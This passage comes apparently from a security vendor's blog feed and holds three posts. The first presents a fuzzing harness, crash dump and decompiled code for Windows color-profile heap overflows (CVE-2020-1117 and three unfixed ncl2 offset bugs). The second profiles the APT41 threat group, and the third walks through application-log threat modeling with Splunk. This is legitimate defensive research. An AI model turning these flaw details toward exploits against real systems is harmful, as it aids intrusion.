  DLLs and EXEs in hope to find the color profile APIs being used.
  Another approach is to find a harness for open source Color Management
  Systems such as Little CMS (LCMS). Both of these end up pointing to
  very small set of APIs with functionality to open color profiles
  and create color transformations.</p>
 <p>Given this information, a simple initial harness was written: </p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">#include &lt;stdio.h&gt;<br />  #include
            &lt;Windows.h&gt;<br />  #include &lt;Icm.h&gt;</span></p> <p>
          <span class="code">#pragma comment(lib,
        &quot;mscms.lib&quot;)</span></p> <p>
          <span class="code">int main(int argc, char** argv)<br />
            {<br />      char dstProfilePath[] = &quot;sRGB Color Space
            Profile.icm&quot;;<br />      tagPROFILE
            destinationProfile;<br />      HPROFILE   hDstProfile =
            nullptr;   </span></p> <p>
          <span class="code">    destinationProfile.dwType =
            PROFILE_FILENAME;<br />      destinationProfile.pProfileData
            = dstProfilePath;<br />      destinationProfile.cbDataSize =
            (strlen(dstProfilePath) + 1);</span></p> <p>
          <span class="code">    hDstProfile =
            OpenColorProfileA(&amp;destinationProfile,
            PROFILE_READ,<br />          FILE_SHARE_READ,
            OPEN_EXISTING);<br />      if (nullptr == hDstProfile)<br />
                {<br />          return -1;<br />      }   </span></p> <p>
          <span class="code">    tagPROFILE sourceProfile;<br />     
            HPROFILE   hSrcProfile = nullptr;<br />      HTRANSFORM
            hColorTransform = nullptr;     </span></p> <p>
          <span class="code">    DWORD dwIntent[] = { INTENT_PERCEPTUAL,
            INTENT_PERCEPTUAL };<br />      HPROFILE hProfileList[2]; 
         </span></p> <p>
          <span class="code">    sourceProfile.dwType =
            PROFILE_FILENAME;<br />      sourceProfile.pProfileData =
            argv[1];<br />      sourceProfile.cbDataSize =
            (strlen(argv[1]) + 1);</span></p> <p>
          <span class="code">    hSrcProfile =
            OpenColorProfileA(&amp;sourceProfile, PROFILE_READ,<br />   
                  FILE_SHARE_READ, OPEN_EXISTING);<br />      if
            (nullptr == hSrcProfile)<br />      {<br />          return
            -1;<br />      }   </span></p> <p>
          <span class="code">    hProfileList[0] = hSrcProfile;<br />   
              hProfileList[1] = hDstProfile;</span></p> <p>
          <span class="code">    hColorTransform =
            CreateMultiProfileTransform(<br />         
            hProfileList,<br />          2,<br />         
            dwIntent,<br />          2,<br />         
            USE_RELATIVE_COLORIMETRIC | BEST_MODE,<br />         
            INDEX_DONT_CARE<br />      );</span></p> <p>
          <span class="code">    if (nullptr == hColorTransform)<br />
                {<br />          return -1;<br />      }   </span></p> <p>
          <span class="code">   
            DeleteColorTransform(hColorTransform);<br />     
            CloseColorProfile(hSrcProfile);<br />     
            CloseColorProfile(hDstProfile);<br />      return 0;<br />
        }</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Listing 1: Harness</span></p>
 <h4>Hunting for Corpus and Dictionary</h4>
 <p>Sites <a href="http://www.color.org/profiles2.xalter">offering
    multiple color profiles</a> can be found all over the internet. One
  of the other main source of color profile is images; many image files
  contain a color profile but require some programming/tools to dump
  their color profile to stand-alone files.</p>
 <p>Simply skimming through the specification, we can also make sure the
  corpus contains at least one sample from all of the seven different
  color profiles. This along with the code coverage information can be
  used to prepare the first set of corpuses for fuzzing.</p>
 <p>A dictionary, which helps the fuzzer to find additional code paths,
  can be prepared by combing through specifications and creating a list
  of unique tag names and values. One can also find dictionaries from
  open source fuzzing attempts on LCMS, etc.</p>
 <h4>Fuzzing</h4>
 <p>I used a 16-core machine to fuzz the harness with my first set
  of corpuses. Code coverage information from MSCMS.dll and ICM32.dll
  was used as feedback for my fuzzer. Crashes started to appear within a
  couple of days.</p>
 <h4>CVE-2020-1117 — Heap Overflow in InitNamedColorProfileData</h4>
 <p>The following crash happens in <span
  class="code">icm32!SwapShortOffset</span> while trying to read out of bounds:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">0:000&gt; r<br />  rax=0000023690497000
            rbx=0000000000000000 rcx=00000000000000ff<br />
            rdx=000000000000ffff rsi=0000023690496f00
            rdi=0000023690496fee<br />  rip=00007ffa46bf3790
            rsp=000000c2a56ff5a8 rbp=0000000000000001<br />
             r8=0000000000000014  r9=0000023690497002
            r10=0000000000000014<br />  r11=0000000000000014
            r12=000000c2a56ff688 r13=0000023690492de0<br />
            r14=000000000000000a r15=000000004c616220<br />
            iopl=0         nv up ei ng nz ac pe cy<br />  cs=0033 
            ss=002b  ds=002b  es=002b  fs=0053  gs=002b            
            efl=00000293<br />  icm32!SwapShortOffset+0x10:<br />
            00007ffa`46bf3790 0fb610          movzx   edx,byte ptr [rax]
        ds:00000236`90497000=??</span></p> <p>
          <span class="code">0:000&gt; !heap -p -a @rax<br />     
            address 0000023690497000 found in<br />      _DPH_HEAP_ROOT
            @ 23690411000<br />      in busy allocation ( 
            DPH_HEAP_BLOCK:         UserAddr         UserSize -        
            VirtAddr         VirtSize)<br />                           
               23690412b60:      23690496f00              100 -     
            23690496000             2000<br />      00007ffa51644807
            ntdll!RtlDebugAllocateHeap+0x000000000000003f<br />     
            00007ffa515f49d6
            ntdll!RtlpAllocateHeap+0x0000000000077ae6<br />     
            00007ffa5157babb
            ntdll!RtlpAllocateHeapInternal+0x00000000000001cb<br />     
            00007ffa51479da0 msvcrt!malloc+0x0000000000000070<br />     
            00007ffa46bf3805 icm32!SmartNewPtr+0x0000000000000011<br />
                00007ffa46bf37c8
            icm32!SmartNewPtrClear+0x0000000000000014<br />     
            00007ffa46c02d05
            icm32!InitNamedColorProfileData+0x0000000000000085<br />   
              00007ffa46bf6e39
            icm32!Create_LH_ProfileSet+0x0000000000004e15<br />     
            00007ffa46bf1973
            icm32!PrepareCombiLUTs+0x0000000000000117<br />     
            00007ffa46bf1814
            icm32!CMMConcatInitPrivate+0x00000000000001f4<br />     
            00007ffa46bf12a1
            icm32!CWConcatColorWorld4MS+0x0000000000000075<br />     
            00007ffa46bf11f4
            icm32!CMCreateMultiProfileTransformInternal+0x00000000000000e8<br />
                00007ffa46bf1039
            icm32!CMCreateMultiProfileTransform+0x0000000000000029<br />
                00007ffa48f16e6c
            mscms!CreateMultiProfileTransform+0x000000000000024c<br />
                00007ff774651191 ldr+0x0000000000001191<br />     
            00007ff7746514b4 ldr+0x00000000000014b4<br />     
            00007ffa505a7bd4
            KERNEL32!BaseThreadInitThunk+0x0000000000000014<br />     
            00007ffa515aced1
        ntdll!RtlUserThreadStart+0x0000000000000021</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Listing 2: Crash info</span></p>
 <p>
  <span class="code">icm32!SwapShortOffset</span> reads unsigned short
  values, <span class="code">bswaps</span> them and stores at the same
  location, giving this crash both read and write primitives.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">unsigned __int16 *__fastcall
            SwapShortOffset(void *sourceBuff, unsigned int offset,
            unsigned int len)<br />  {<br />    unsigned __int16
            *endBuff; // r9<br />    unsigned __int16 *result; //
        rax</span></p> <p>
          <span class="code">  endBuff = (sourceBuff + len);<br />
              for ( result = (sourceBuff + offset); result &lt; endBuff;
            ++result )<br />      *result =
            _byteswap_ushort(*result);        // read, bswap and
            write<br />    return result;<br />  }</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Listing 3: SwapShortOffset decompiled</span></p>
 <p>The crashing function <span
  class="code">icm32!SwapShortOffset</span> doesn’t immediately point to
  the root cause of the bug. For that, we need to go one call up to
    <span class="code">icm32!InitNamedColorProfileData</span>.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">__int64 __fastcall
          InitNamedColorProfileData(__int64 a1, void *hProfile, int a3,
          _DWORD *a4)<br />  {<br />    ...<br />    ...<br />   
          errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0,
          pBuffSize, 0i64);      // getting size of ncl2 element<br />
            if ( errCode )<br />      return errCode;<br />    minSize =
          pBuffSize[0];<br />    if ( pBuffSize[0] &lt; 0x55 )<br />   
            minSize = 0x55;<br />    pBuffSize[0] = minSize;<br />   
          outBuff = SmartNewPtrClear(minSize,
          &amp;errCode);                                    //
          allocating the buffer for ncl2<br />    ...<br />    ...<br />
            errCode = CMGetPartialProfileElement(hProfile, 'ncl2', 0,
          pBuffSize, outBuff);    // reading ncl2 elements to
          buffer<br />    if ( !errCode )<br />    {<br />   
            ...<br />      ...<br />      totalSizeToRead = count *
          totalDeviceCoord;<br />      if ( totalSizeToRead &lt;
          0xFFFFFFFFFFFFFFAEui64 &amp;&amp; totalSizeToRead + 0x51 &lt;=
          pBuffSize[0] )  // totalSizeToRead + 0x51 &lt;= element
          size?<br />      {<br />        currPtr = outBuff +
          0x54;            // wrong offset of 0x54 is used<br />     
            ...<br />        ...<br />        do<br />        {   <br />
                  SwapShortOffset((currPtr + 0x20), 0, 6u);<br />       
            ...<br />          --count;<br />     
        }while(count)</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Listing 4: InitNamedColorProfileData decompiled</span></p>
 <p>Here the code tries to read the ‘ncl2’ tag/element and get the size
  of the stream from file. A buffer is allocated and the same call is
  made once again to read the complete content of the element ‘ncl2’.
  This buffer is parsed to find the count and number of device
  coordinates, and the values are verified by making sure read/write
  ends up with in the buffer size. The vulnerability here is that the
  offset (0x51) used for verification is smaller than the offset (0x54)
  used to advance the buffer pointer. This error provides a 3 byte out
  of bound read and write.</p>
 <p>The fix for this was pretty straight forward—change the verification
  offset to 0x54, which is how Microsoft fixed this bug.</p>
 <h4>Additional Vulnerabilities</h4>
 <p>While looking at the previous vulnerability, one can see a pattern
  of using the <span class="code">CMGetPartialProfileElement</span>
  function for reading the size, allocation, and reading content. This
  sort of pattern can introduce bugs such as unconstrained size or
  integer overflow while adding an offset to the size, etc. I decided to
  pursue this function and see if such instances are present within ICM32.dll.</p>
 <p>I found three instances which had an unchecked offset access: <span
  class="code">CMConvIndexToNameProfile</span>, <span
  class="code">CMConvNameToIndexProfile</span> and <span
  class="code">CMGetNamedProfileInfoProfile</span>. All of these
  functions are accessible through exported and documented MSCMS
  functions: <span class="code">ConvertIndexToColorName</span>, <span
  class="code">CMConvertColorNameToIndex</span>, and <span
  class="code">GetNamedProfileInfo</span> respectively.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">__int64 __fastcall
          CMConvIndexToNameProfile(HPROFILE hProfile, __int64 a2,
          __int64 a3, unsigned int a4)<br />  {<br />    ...<br />
            ...<br />    errCode = CMGetPartialProfileElement(hProfile,
          'ncl2', 0, pBuffSize, 0i64);    // read size<br />    if (
          !errCode )<br />    {<br />      allocBuff =
          SmartNewPtr(pBuffSize[0], &amp;errCode);<br />      if (
          !errCode )<br />      {<br />        errCode =
          CMGetPartialProfileElement(hProfile, 'ncl2', 0, pBuffSize,
          allocBuff);    // read to buffer<br />        if ( !errCode
          )<br />        {<br />          SwapLongOffset((allocBuff +
          12), 0, 4u);         // 12 &gt; *pBuffSize ?<br />         
          SwapLongOffset((allocBuff + 16), v12, v13);</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Listing 5: CMConvIndexToNameProfile decompiled</span></p>
 <p>The bug discovered in <span
  class="code">CMConvIndexToNameProfile</span> and the other two
  functions is that there is no minimum length check for ‘ncl2’ elements
  and offsets 12 and 16 are directly accessed for both read and
  write—providing out of bound read/write to <span
  class="code">allocBuffer</span>, if the size of <span
  class="code">allocBuffer</span> is smaller than 12.</p>
 <p>Microsoft decided not to immediately fix these three vulnerabilities
  due to the fact that none of the Windows binaries use these functions.
  Independently, we did not find any Windows or third-party software
  using these APIs.</p>
 <h4>Conclusion</h4>
 <p>In part one of this blog series, we looked into color profiles,
  wrote a harness, hunted for corpus and successfully found multiple
  vulnerabilities. Stay tuned for part two, where we will be looking at
  a relatively less talked about vulnerability class: uninitialized memory.</p>
http://www.fireeye.com/blog/threat-research/2020/09/fuzzing-image-parsing-in-windows-color-profiles.html2020-09-24T15:00:00.000Z2020-09-23T20:24:46.982ZAPT41: A Dual Espionage and Cyber Crime Operationnoemail@noemail.orgNalani Fraser<p>Today, FireEye Intelligence is releasing a comprehensive report
  detailing APT41, a prolific Chinese cyber threat group that carries
  out state-sponsored espionage activity in parallel with financially
  motivated operations. APT41 is unique among tracked China-based actors
  in that it leverages non-public malware typically reserved for
  espionage campaigns in what appears to be activity for personal gain.
  Explicit financially-motivated targeting is unusual among Chinese
  state-sponsored threat groups, and evidence suggests APT41 has
  conducted simultaneous cyber crime and cyber espionage operations from
  2014 onward.</p>
 <p>The <a href="http://content.fireeye.com/apt41/rpt-apt41">full
    published report</a> covers historical and ongoing activity
  attributed to APT41, the evolution of the group’s tactics, techniques,
  and procedures (TTPs), information on the individual actors, an
  overview of their malware toolset, and how these identifiers overlap
  with other known Chinese espionage operators. APT41 partially
  coincides with public reporting on groups including BARIUM (<a
  href="https://www.microsoft.com/security/blog/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/">Microsoft</a>)
  and Winnti (<a
  href="https://securelist.com/winnti-more-than-just-a-game/37029/">Kaspersky</a>,
    <a
  href="https://www.welivesecurity.com/2019/03/11/gaming-industry-scope-attackers-asia/">ESET</a>,
    <a href="https://www.clearskysec.com/winnti/">Clearsky</a>).</p>
 <h4>Who Does APT41 Target?</h4>
 <p>Like other Chinese espionage operators, APT41 espionage targeting
  has generally aligned with <a
    href="https://www.uscc.gov/sites/default/files/Research/The%2013th%20Five-Year%20Plan_Final_2.14.17_Updated%20%28002%29.pdf">China's
    Five-Year economic development plans</a>. The group has established
  and maintained strategic access to organizations in the healthcare,
  high-tech, and telecommunications sectors. APT41 operations against
  higher education, travel services, and news/media firms provide some
  indication that the group also tracks individuals and conducts
  surveillance. For example, the group has repeatedly targeted call
  record information at telecom companies. In another instance, APT41
  targeted a hotel’s reservation systems ahead of Chinese officials
  staying there, suggesting the group was tasked to reconnoiter the
  facility for security reasons.</p>
 <p>The group’s financially motivated activity has primarily focused on
  the video game industry, where APT41 has manipulated virtual
  currencies and even attempted to deploy ransomware. The group is adept
  at moving laterally within targeted networks, including pivoting
  between Windows and Linux systems, until it can access game production
  environments. From there, the group steals source code as well as
  digital certificates which are then used to sign malware. More
  importantly, APT41 is known to use its access to production
  environments to inject malicious code into legitimate files which are
  later distributed to victim organizations. These supply chain
  compromise tactics have also been characteristic of APT41’s best known
  and most recent espionage campaigns.</p>
 <p>Interestingly, despite the significant effort required to execute
  supply chain compromises and the large number of affected
  organizations, APT41 limits the deployment of follow-on malware to
  specific victim systems by matching against individual system
  identifiers. These multi-stage operations restrict malware delivery
  only to intended victims and significantly obfuscate the intended
  targets. In contrast, a typical spear-phishing campaign’s desired
  targeting can be discerned based on recipients' email addresses.</p>
 <p>A breakdown of industries directly targeted by APT41 over time can
  be found in Figure 1.</p>
 <p> </p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt41/Picture1b.png" />
  <br /> <span class="type-XS">Figure 1: Timeline of industries directly
    targeted by APT41</span></p>
 <h4>Probable Chinese Espionage Contractors</h4>
 <p>Two identified personas using the monikers “Zhang Xuguang” and
  “Wolfzhi” linked to APT41 operations have also been identified in
  Chinese-language forums. These individuals advertised their skills and
  services and indicated that they could be hired. Zhang listed his
  online hours as 4:00pm to 6:00am, similar to APT41 operational times
  against online gaming targets and suggesting that he is moonlighting.
  Mapping the group’s activities since 2012 (Figure 2) also provides
  some indication that APT41 primarily conducts financially motivated
  operations outside of their normal day jobs.</p>
 <p>Attribution to these individuals is backed by identified persona
  information, their previous work and apparent expertise in programming
  skills, and their targeting of Chinese market-specific online
  games. The latter is especially notable because APT41 has repeatedly
  returned to targeting the video game industry and we believe these
  activities were formative in the group’s later espionage operations.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt41/Picture2.png" />
  <br /> <span class="type-XS">Figure 2: Operational activity for gaming
    versus non-gaming-related targeting based on observed operations
    since 2012</span></p>
 <h4>The Right Tool for the Job</h4>
 <p>APT41 leverages an arsenal of over 46 different malware families and
  tools to accomplish their missions, including publicly available
  utilities, malware shared with other Chinese espionage operations, and
  tools unique to the group. The group often relies on spear-phishing
  emails with attachments such as compiled HTML (.chm) files to
  initially compromise their victims. Once in a victim organization,
  APT41 can leverage more sophisticated TTPs and deploy additional
  malware. For example, in a campaign running almost a year, APT41
  compromised hundreds of systems and used close to 150 unique pieces of
  malware including backdoors, credential stealers, keyloggers, and rootkits.</p>
 <p>APT41 has also deployed rootkits and Master Boot Record (MBR)
  bootkits on a limited basis to hide their malware and maintain
  persistence on select victim systems. The use of bootkits in
  particular adds an extra layer of stealth because the code is executed
  prior to the operating system initializing. The limited use of these
  tools by APT41 suggests the group reserves more advanced TTPs and
  malware only for high-value targets.</p>
 <h4>Fast and Relentless</h4>
 <p>APT41 quickly identifies and compromises intermediary systems that
  provide access to otherwise segmented parts of an organization’s
  network. In one case, the group compromised hundreds of systems across
  multiple network segments and several geographic regions in as little
  as two weeks.</p>
 <p>The group is also highly agile and persistent, responding quickly to
  changes in victim environments and incident responder activity. Hours
  after a victimized organization made changes to thwart APT41, for
  example, the group compiled a new version of a backdoor using a
  freshly registered command-and-control domain and compromised several
  systems across multiple geographic regions. In a different instance,
  APT41 sent spear-phishing emails to multiple HR employees three days
  after an intrusion had been remediated and systems were brought back
  online. Within hours of a user opening a malicious attachment sent by
  APT41, the group had regained a foothold within the organization's
  servers across multiple geographic regions.</p>
 <h4>Looking Ahead</h4>
 <p>APT41 is a creative, skilled, and well-resourced adversary, as
  highlighted by the operation’s distinct use of supply chain
  compromises to target select individuals, consistent signing of
  malware using compromised digital certificates, and deployment of
  bootkits (which is rare among Chinese APT groups).</p>
 <p>Like other Chinese espionage operators, APT41 appears to have moved
  toward strategic intelligence collection and establishing access and
  away from direct intellectual property theft since 2015. This shift,
  however, has not affected the group's consistent interest in targeting
  the video game industry for financially motivated reasons. The group's
  capabilities and targeting have both broadened over time, signaling
  the potential for additional supply chain compromises affecting a
  variety of victims in additional verticals.</p>
 <p>APT41's links to both underground marketplaces and state-sponsored
  activity may indicate the group enjoys protections that enables it to
  conduct its own for-profit activities, or authorities are willing to
  overlook them. It is also possible that APT41 has simply evaded
  scrutiny from Chinese authorities. Regardless, these operations
  underscore a blurred line between state power and crime that lies at
  the heart of threat ecosystems and is exemplified by APT41.</p>
 <p>
  <a href="https://content.fireeye.com/apt-41/rpt-apt41/">Read the
    report today to learn more</a>.</p>
http://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html2019-08-07T12:00:00.000Z2020-09-16T15:53:26.839ZA &quot;DFUR-ent&quot; Perspective on Threat Modeling and Application
Log Forensic Analysisnoemail@noemail.orgRyan Tomcik<p>Many organizations operating in e-commerce, hospitality, healthcare,
  managed services, and other service industries rely on web
  applications. And buried within the application logs may be the
  potential discovery of fraudulent use and/or compromise! But, let's
  face it, finding evil in application logs can be difficult and
  overwhelming for a few reasons, including:</p>
 <ul> <li>The wide variety of web applications with unique
  functionality</li> <li>The lack of a standard logging format</li>
    <li>Logging formats that were designed for troubleshooting
    application issues and not security investigations</li> <li>The need
    for a centralized log analysis solution or SIEM to process and
    investigate a large amount of application log data</li> </ul>
 <p>So, in this blog post, we discuss threat modeling concepts that can
  help prioritize logging decisions and unleash the ability to identify
  and investigate attacks against an application. To help us
  demonstrate, we'll describe situations for a fictitious organization
  called Dog and Feline Urgent Response, or DFUR, that we <a
    href="https://www.youtube.com/watch?v=_soMAPXJs5c">presented at the
    2020 SANS Digital Forensics &amp; Incident Response (DFIR) Summit</a>.</p>
 <p>We selected Splunk Enterprise Security (ES) as DFUR’s SIEM and
  logging analysis platform, but this is just one option and there are
  multiple technologies that can facilitate application log analysis. We
  created a Splunk application called “<a
    href="https://github.com/fireeye/DFUR-Splunk-App">Dog and Feline
    Urgent Response (DFUR)</a>” available on the FireEye GitHub that
  contains pre-indexed data and dashboards that you can use to follow
  along with the following attack scenarios.</p>
 <p>But, enough kitten around. Let’s introduce you to DFUR!</p>
 <h4>DFUR: Dog and Feline Urgent Response</h4>
 <p>DFUR is a long-standing organization in the pet wellness industry
  that provides care providers, pet owners, and insurance providers with
  application services.</p>
 <ul> <li>Care providers, such as veterinarians, use DFUR to process
    patient records, submit prescriptions, and order additional care
  services</li> <li>Pet owners use DFUR to make appointments, pay bills,
    and see diagnostic test results</li> <li>Insurance providers use
    DFUR to receive and pay claims to pet care providers</li> </ul>
 <p>Application users log into a web portal that forwards logon and user
  transaction logs to DFUR’s Splunk ES instance. Backend databases store
  metadata for users, such as street addresses and contact information.</p>
 <p>
  <i>DFUR Security Team Threat Modeling</i></p>
 <p>After stumbling through several incidents, the DFUR security team
  realized that their application did not log the information needed to
  answer investigative question clearly and quickly. The team held
  workshops with technical stakeholders to develop a threat model and
  improve their application security strategy. They addressed questions,
  such as:</p>
 <ul> <li>What types of threats does DFUR face based on industry
  trends?</li> <li>What impact could those threats have?</li> <li>How
    could the DFUR application be attacked or abused?</li> <li>What log
    data would DFUR need to prove an attack or fraud happened?</li> </ul>
 <p>The DFUR team compiled the stakeholder feedback and developed a
  threat profile to identify and prioritize high-risk threats facing the
  DFUR application platform, including:</p>
 <ul> <li>Account takeover and abuse<ul> <li>Password attacks (e.g.,
        credential stuffing)</li> <li>Bank account modifications</li>
        <li>PHI/PII access</li> <li>Health service modifications or
      interruptions</li> </ul> </li> <li>Fraudulent reimbursement claim
  submission</li> <li>Veterinarians over-prescribing catnip</li> </ul>
 <p>The DFUR security team discussed how they could identify threats
  using their currently available logs, and, well, the findings were not purr-ty.</p>
 <p>
  <i>Logging Problems Identified</i></p>
 <p>The DFUR team used their threat model to determine what log sources
  were relevant to their security mission, and then they dug into each
  one to confirm the log events were valid, normalized, and accessible.
  This effort produced a list of high-priority logging issues that
  needed to be addressed before the security team could move forward
  with developing methods for detection and analysis:</p>
 <ul> <li>
    <b>Local logs were not forwarded to their Splunk ES instance</b>.
    Only a limited subset of logging was forwarded to their Splunk ES
    instance, so DFUR analysts couldn't search for the actions performed
    by users who were authenticated to the application portal.</li> <li>
    <b>Inaccurate field mapping</b>. DFUR analysts identified extracted
    field values that were mapped to incorrect field names. One example
    was the user-agent in authentication log events had been extracted
    as the username field.</li> <li>
    <b>Application updates sometimes affected Splunk ingestion and
      parsing. </b>DFUR analysts identified servers that didn't have a
    startup script to ensure log forwarding was enabled upon system
    reboot. Application updates changed the logging output format which
    broke field extractions. DFUR analysts didn't have a way to
    determine when log sources weren't operating as expected.</li> <li>
    <b>Time zone misconfigurations</b>. DFUR analysts determined their
    log sources had multiple time zone configurations which made
    correlation difficult.</li> <li>
    <b>The log archival settings needed to be modified</b>. DFUR
    analysts needed to configure their Splunk ES instance data
    retirement policy to maintain indexed data for a longer time period
    and archive historical data for quick restoration.</li> <li>
    <b>Source IP addresses of users logging into the portal were masked
      by a load balancer.</b> The DFUR analysts realized that the source
    IP address for every user logon was a load balancer, which made
    attribution even more difficult. The X-Forwarded-For (XFF) field in
    their appliances needed to be enabled.</li> </ul>
 <p>
  <i>Analysis Problems Identified</i></p>
 <p>The DFUR infosec team reviewed how previous incidents involving the
  DFUR application were handled. They quickly learned that they needed
  to solve the following operational issues before they could
  effectively investigate application attacks:</p>
 <ul> <li>
    <b>Inconsistency during manual analysis</b>. DFUR analysts took
    different approaches to searching their Splunk ES instance, and they
    would reach different conclusions. Playbooks were needed to define a
    standard investigative methodology for common incident
  scenarios.</li> <li>
    <b>No documentation of log fields or sources</b>. Some DFUR analysts
    were not aware of all relevant data sources that were available when
    investigating security incidents. This led to findings that were
    based on a small part of the picture. A data dictionary was needed
    that defines the log sources and fields in the DFUR Splunk ES
    instance and the retention time for each log source.</li> <li>
    <b>Application logs were designed for troubleshooting, not
    investigating</b>. The DFUR application was configured to log
    diagnostic information, application errors, and limited subsets of
    successful user activity. The DFUR team needed to reconfigure and
    develop the application to record more security related events.</li> </ul>
 <h4>DFUR: New and Improved Monitoring and Detection</h4>
 <p>The DFUR team addressed their application log and analysis problems
  and started building a detection and investigative capability in their
  Splunk ES instance. Using the analysis workflows developed during the
  threat modeling process, the DFUR team designed Splunk dashboards
  (Figure 1) to provide detection analytics and context around three
  primary datapoints: usernames, IP addresses, and care providers (“organizations”).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture1a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 1: DFUR monitoring and detection dashboard</span></p>
 <p>The DFUR team created the Splunk dashboards using Simple XML to
  quickly identify alerts and pivot among the primary datapoints, as
  seen in Figure 2. The DFUR team knew that their improved and
  streamlined methodology would save time compared to exporting,
  analyzing, and correlating raw logs manually.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Pivoting concepts used to
    develop DFUR dashboards</span></p>
 <p>Newly armed (legged?) with a monitoring and detection capability,
  the DFUR team was ready to find evil!</p>
 <p>
  <i>Attack Scenario #1: Account Takeover</i></p>
 <p>The next morning, the DFUR security team was notified by their
  customer service team of a veterinarian provider with the username
  ‘labradorable’ who hadn’t received their daily claims payment and
  noticed their banking information in the DFUR portal was changed overnight.</p>
 <p>A DFUR analyst opened the User Activity Enrichment dashboard (Figure
  3) and searched for the username to see recent actions performed by
  the account.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture3a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 3: User Activity Enrichment dashboard</span></p>
 <p>The analyst reviewed the Remote Access Analytics in the dashboard
  and identified the following anomalies (Figure 4):</p>
 <ul> <li>The username reminder and password reset action was performed
    the day before from an Indonesia-based IP address</li> <li>The user
    account was logged in from the same suspicious IP address shortly
  after</li> <li>The legitimate user always logs in from California, so
    the Indonesia source IP login activity was highly suspicious</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture4a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 4: Remote access analytics based on user activity</span></p>
 <p>The DFUR analyst clicked on the Application Activity tab in the User
  Activity Enrichment dashboard to see what actions were performed by
  the user while they were logged in from the suspicious IP address. The
  analyst identified the user account logged in from the suspicious IP
  address and performed an email address change and added two (2) new
  bank accounts, as seen in Figure 5.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture5a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 5: Application activity timeline filtered based on IP address</span></p>
 <p>The DFUR analyst confirmed that the two (2) bank accounts were added
  by the user to the care provider with organization ID 754354, as seen
  in Figure 6.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Bank accounts added and
    assigned to a provider</span></p>
 <p>By clicking on the organization ID in the Splunk results table, the
  DFUR analyst triggered a drill-down action to automatically open the
  Organization Enrichment Dashboard and populate the organization ID
  value with the results from the previous panel (Figure 7). The DFUR
  analyst determined that the bank routing information for the new bank
  accounts was inconsistent with the organization’s mailing address.  </p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture7a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 7: Organization Enrichment Dashboard</span></p>
 <p>The activity indicated that the attacker had access to the user’s
  primary email and successfully reset the DFUR account password. The
  DFUR analyst confirmed that no other accounts were targeted by the
  suspicious IP address (Figure 8).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture8a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 8: IP Address Enrichment dashboard</span></p>
 <p>
  <i>Attack Scenario #2: Credential Stuffing</i></p>
 <p>Later that afternoon, the DFUR team began receiving reports of
  account lockouts in the patient and provider portals when users tried
  to login. The security team was asked to investigate potential
  password attack activity on their DFUR platform.</p>
 <p>The DFUR analyst pulled up the main monitoring and detection
  dashboard and scrolled down to the panel focused on identifying
  potential password attack activity (Figure 9). They identified five
  (5) IP addresses associated with an elevated number of failed login
  attempts, suggesting a password spray or credential stuffing attack
  with varying success.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture9a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 9: Dashboard panel showing potential password attack events</span></p>
 <p>The DFUR analyst clicked on one of the IP addresses which triggered
  a drill-down action to open the IP Address Enrichment dashboard and
  prepopulate the IP address token value (Figure 10).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture10a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 10: IP Address Enrichment dashboard</span></p>
 <p>The DFUR analyst identified more than 3,000 failed login attempts
  associated with the IP address with three (3) successful logins that
  morning. The Remote Access Analytics panels for the IP address further
  showed successful logins for accounts that may have been successfully
  compromised and need to be reset (Figure 11).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dfur/picture11a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 11: Remote access analytics for IP address</span></p>
 <h4>Conclusion</h4>
 <p>After implementing the newly developed logs and analysis
  capabilities and by leveraging Splunk’s security solutions, the DFUR
  security team drastically improved key metrics aligned with their
  application security missions:</p>
 <ol> <li>Identify compromise and fraud before customers report it</li>
    <li>Analyze 90% of application security events within 30
  minutes</li> <li>Answer all investigation questions from users,
    compliance, and legal teams</li> </ol>
 <p>Mandiant and the whole DFUR security team hope you can use the
  scenarios and references in this post to improve your log analysis and
  how you leverage a SIEM solution in the following ways:</p>
 <ul> <li>Reflect on your current logging gaps and capabilities to
